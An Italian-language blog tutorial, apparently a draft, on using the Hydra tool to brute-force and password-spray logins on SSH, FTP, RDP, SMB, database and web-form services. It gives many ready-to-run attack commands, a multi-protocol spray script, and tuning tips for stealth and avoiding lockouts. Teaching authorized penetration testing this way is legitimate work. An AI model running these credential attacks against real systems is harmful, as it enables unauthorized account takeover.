---
title: 'Hydra: Brute Force Login per Servizi di Rete'
slug: hydra
description: 'Hydra è un tool di brute force per testare credenziali su SSH, FTP, RDP, HTTP e altri servizi durante penetration test autorizzati.'
image: /Gemini_Generated_Image_524p3j524p3j524p.webp
draft: true
date: 2026-02-15T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - bruteforce
---

Hydra è il tool di riferimento per attacchi bruteforce e dictionary attack su servizi di rete. In questa guida impari a crackare credenziali SSH, FTP, HTTP forms, RDP, database e decine di altri protocolli. Dalla configurazione base agli attacchi distribuiti.

## Cos'è Hydra

Hydra (THC-Hydra) esegue attacchi password parallelizzati contro:

* SSH, FTP, Telnet
* HTTP/HTTPS (Basic, Digest, Form)
* SMB, RDP, VNC
* MySQL, PostgreSQL, MSSQL, Oracle
* LDAP, SMTP, POP3, IMAP
* E oltre 50 altri protocolli

## Installazione e Setup

### Kali Linux

```bash
# Preinstallato, verifica versione
hydra -h

# Aggiorna
sudo apt update && sudo apt install hydra -y
```

### Debian/Ubuntu

```bash
# Installa con tutte le dipendenze
sudo apt install hydra hydra-gtk -y
```

### Compilazione da Source

```bash
# Per supporto completo protocolli
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

Output versione:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
```

## Uso Base di Hydra

### Sintassi Generale

```bash
hydra [opzioni] target protocollo
hydra -l user -P wordlist.txt target ssh
```

### Parametri Fondamentali

| Parametro | Funzione               | Esempio          |
| --------- | ---------------------- | ---------------- |
| `-l`      | Username singolo       | `-l admin`       |
| `-L`      | Lista username         | `-L users.txt`   |
| `-p`      | Password singola       | `-p password123` |
| `-P`      | Lista password         | `-P rockyou.txt` |
| `-C`      | File combo user:pass   | `-C creds.txt`   |
| `-t`      | Tasks paralleli        | `-t 16`          |
| `-s`      | Porta custom           | `-s 2222`        |
| `-o`      | Output file            | `-o results.txt` |
| `-f`      | Stop al primo successo | `-f`             |
| `-v`      | Verbose                | `-v`             |
| `-V`      | Mostra ogni tentativo  | `-V`             |

### Wordlist Essenziali

```bash
# Kali wordlists
/usr/share/wordlists/rockyou.txt                    # 14 milioni password
/usr/share/wordlists/fasttrack.txt                  # 222 password comuni
/usr/share/seclists/Passwords/Common-Credentials/   # Varie liste

# Decomprimi rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

## Attacchi per Protocollo

### SSH Bruteforce

```bash
# Username singolo, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, password list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Porta custom
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Velocità controllata
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100
```

Output successo:

```
[22][ssh] host: 192.168.1.100   login: root   password: toor
```

### FTP Bruteforce

```bash
# FTP standard
hydra -l admin -P passwords.txt ftp://192.168.1.100

# FTP anonimo check
hydra -l anonymous -p anonymous ftp://192.168.1.100

# Con timeout
hydra -l admin -P passwords.txt -t 10 -w 30 ftp://192.168.1.100
```

### RDP Bruteforce

```bash
# Remote Desktop
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# Domain user
hydra -l "DOMAIN\\admin" -P passwords.txt rdp://192.168.1.100
```

### SMB Bruteforce

```bash
# SMB/CIFS
hydra -l administrator -P passwords.txt smb://192.168.1.100

# Integra con [CrackMapExec](https://hackita.it/articoli/crackmapexec) per post-exploitation
```

### [MySQL](https://hackita.it/articoli/mysql) Bruteforce

```bash
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# Porta custom
hydra -l root -P passwords.txt -s 3307 mysql://192.168.1.100
```

### PostgreSQL Bruteforce

```bash
# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100
```

### MSSQL Bruteforce

```bash
# Microsoft SQL Server
hydra -l sa -P passwords.txt mssql://192.168.1.100
```

## HTTP/HTTPS Form Bruteforce

### HTTP Basic Auth

```bash
# Basic authentication
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.100/admin
```

### HTTP POST Form

Sintassi form:

```
http-post-form "path:parameters:failure_string"
```

```bash
# Login form standard
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Con HTTPS
hydra -l admin -P passwords.txt 192.168.1.100 https-post-form \
      "/login:user=^USER^&pass=^PASS^:F=Login failed"
```

### Identificare Failure String

```bash
# 1. Tenta login manuale con credenziali errate
# 2. Osserva messaggio di errore nella response
# 3. Usa quel messaggio come failure string

# Esempi comuni:
# "Invalid username or password"
# "Login failed"
# "Incorrect credentials"
# "Authentication error"
```

### Form con CSRF Token

```bash
# Hydra non gestisce CSRF nativamente
# Usa Burp Intruder o script custom per CSRF tokens
# Oppure [Patator](https://hackita.it/articoli/patator) che supporta token dinamici
```

## Tecniche Avanzate

### Combo File (user:pass)

```bash
# File formato user:password
# creds.txt:
# admin:admin
# root:toor
# user:password123

hydra -C creds.txt ssh://192.168.1.100
```

### Password Spray

```bash
# Una password, molti utenti (evita lockout)
hydra -L users.txt -p "Summer2024!" ssh://192.168.1.100

# Multiple password comuni
hydra -L users.txt -p "Password1" ssh://192.168.1.100
hydra -L users.txt -p "Welcome1" ssh://192.168.1.100
hydra -L users.txt -p "Company2024" ssh://192.168.1.100
```

### Resume Attack

```bash
# Salva stato per resume
hydra -l admin -P biglist.txt -o results.txt ssh://192.168.1.100

# Se interrotto, Hydra salva hydra.restore
# Resume con:
hydra -R
```

### Multiple Targets

```bash
# File con lista target
# targets.txt:
# 192.168.1.100
# 192.168.1.101
# 192.168.1.102

hydra -l admin -P passwords.txt -M targets.txt ssh
```

### Output Parsing

```bash
# Salva risultati
hydra -l admin -P passwords.txt -o found.txt ssh://192.168.1.100

# Formato JSON
hydra -l admin -P passwords.txt -o found.json -b json ssh://192.168.1.100
```

## Scenari Pratici di Penetration Test

### Scenario 1: SSH Server Discovery e Attack

```bash
# Step 1: Trova SSH servers con nmap
nmap -p 22 --open 192.168.1.0/24 -oG ssh_hosts.txt

# Step 2: Estrai IP
grep "22/open" ssh_hosts.txt | cut -d " " -f 2 > targets.txt

# Step 3: Password spray
hydra -L common_users.txt -p "Password123" -M targets.txt ssh

# Step 4: Se trovato, accedi
ssh user@192.168.1.100
```

### Scenario 2: Web Login Attack

```bash
# Step 1: Identifica form con Burp
# POST /login HTTP/1.1
# username=test&password=test

# Step 2: Identifica failure string
curl -X POST -d "username=admin&password=wrong" http://target.com/login
# Response: "Invalid credentials"

# Step 3: Hydra attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Scenario 3: Database Credentials

```bash
# Step 1: Identifica database con nmap
nmap -sV -p 3306,5432,1433 192.168.1.100

# Step 2: Attack MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# Step 3: Se successo, connetti
mysql -h 192.168.1.100 -u root -p
```

### Scenario 4: Multi-Protocol Spray

```bash
#!/bin/bash
# spray.sh - Password spray su tutti i servizi

TARGET=$1
USERS="users.txt"
PASS="Company2024!"

# SSH
hydra -L $USERS -p "$PASS" ssh://$TARGET -t 4

# SMB
hydra -L $USERS -p "$PASS" smb://$TARGET -t 4

# RDP
hydra -L $USERS -p "$PASS" rdp://$TARGET -t 4

# FTP
hydra -L $USERS -p "$PASS" ftp://$TARGET -t 4
```

## Ottimizzazione e Tuning

### Velocità vs Stealth

```bash
# Aggressivo (veloce, rumoroso)
hydra -l admin -P passwords.txt -t 64 -f ssh://target

# Stealth (lento, meno detection)
hydra -l admin -P passwords.txt -t 1 -w 30 ssh://target
```

### Evitare Lockout

```bash
# Delay tra tentativi
hydra -l admin -P passwords.txt -t 1 -W 5 ssh://target

# Password spray invece di bruteforce
hydra -L users.txt -p "Password1" ssh://target
```

### Timeout Settings

```bash
# Aumenta timeout per connessioni lente
hydra -l admin -P passwords.txt -t 4 -w 60 ssh://target

# -w: wait time for responses (secondi)
# -c: time between connections (secondi)
```

## Tabella Protocolli Supportati

| Protocollo | Modulo Hydra   | Esempio                         |
| ---------- | -------------- | ------------------------------- |
| SSH        | ssh            | `hydra ssh://target`            |
| FTP        | ftp            | `hydra ftp://target`            |
| Telnet     | telnet         | `hydra telnet://target`         |
| HTTP GET   | http-get       | `hydra http-get://target/admin` |
| HTTP POST  | http-post-form | `hydra http-post-form://target` |
| HTTPS      | https-get/post | `hydra https-get://target`      |
| SMB        | smb            | `hydra smb://target`            |
| RDP        | rdp            | `hydra rdp://target`            |
| VNC        | vnc            | `hydra vnc://target`            |
| MySQL      | mysql          | `hydra mysql://target`          |
| PostgreSQL | postgres       | `hydra postgres://target`       |
| MSSQL      | mssql          | `hydra mssql://target`          |
| LDAP       | ldap2/ldap3    | `hydra ldap2://target`          |
| SMTP       | smtp           | `hydra smtp://target`           |
| POP3       | pop3           | `hydra pop3://target`           |
| IMAP       | imap           | `hydra imap://target`           |
| SNMP       | snmp           | `hydra snmp://target`           |

## Integrazione con Altri Tool

### Hydra + Nmap

```bash
# Scan servizi con nmap
nmap -sV 192.168.1.100 -oX scan.xml

# Parse per servizi interessanti
grep -E "ssh|ftp|mysql|smb" scan.xml
```

### Hydra + CeWL

```bash
# Genera wordlist da sito target
cewl http://target.com -w custom_words.txt

# Usa con Hydra
hydra -l admin -P custom_words.txt http-post-form://target.com/login...
```

### Hydra + Burp Suite

```bash
# Analizza request in Burp
# Identifica parametri e failure string
# Costruisci comando Hydra
```

## Troubleshooting

### Errore: "Connection refused"

```bash
# Verifica servizio attivo
nmap -p 22 target
nc -zv target 22

# Verifica firewall
```

### Errore: "Too many connections"

```bash
# Riduci threads
hydra -t 4 ...

# Aumenta delay
hydra -t 4 -W 5 ...
```

### HTTP Form Non Funziona

```bash
# 1. Verifica parametri corretti (usa Burp)
# 2. Verifica failure string esatta
# 3. Aggiungi header se necessario
hydra -l admin -P pass.txt http-post-form \
      "/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie: session=abc"
```

### Troppi False Positive

```bash
# Verifica failure string più specifica
# Usa success string invece (S=)
hydra ... "...:S=Welcome admin"
```

## FAQ

**Hydra vs Medusa vs Patator?**

Hydra è il più veloce e supporta più protocolli. Medusa è più stabile per attacchi lunghi. [Patator](https://hackita.it/articoli/patator) è più flessibile per casi complessi. Usa Hydra come default.

**Come evito account lockout?**

Usa password spray (una password, molti utenti), aumenta delay tra tentativi, limita threads. Conosci la policy di lockout prima di attaccare.

**Hydra funziona con 2FA?**

No direttamente. 2FA richiede interazione dinamica. Cerca bypass 2FA o usa tool specifici.

**Posso usare GPU con Hydra?**

No, Hydra è per attacchi online (rete). Per cracking offline con GPU usa [Hashcat](https://hackita.it/articoli/hashcat).

**È legale usare Hydra?**

Solo su sistemi autorizzati. L'uso non autorizzato è reato. Per pentest professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra) | [SecLists](https://github.com/danielmiessler/SecLists)
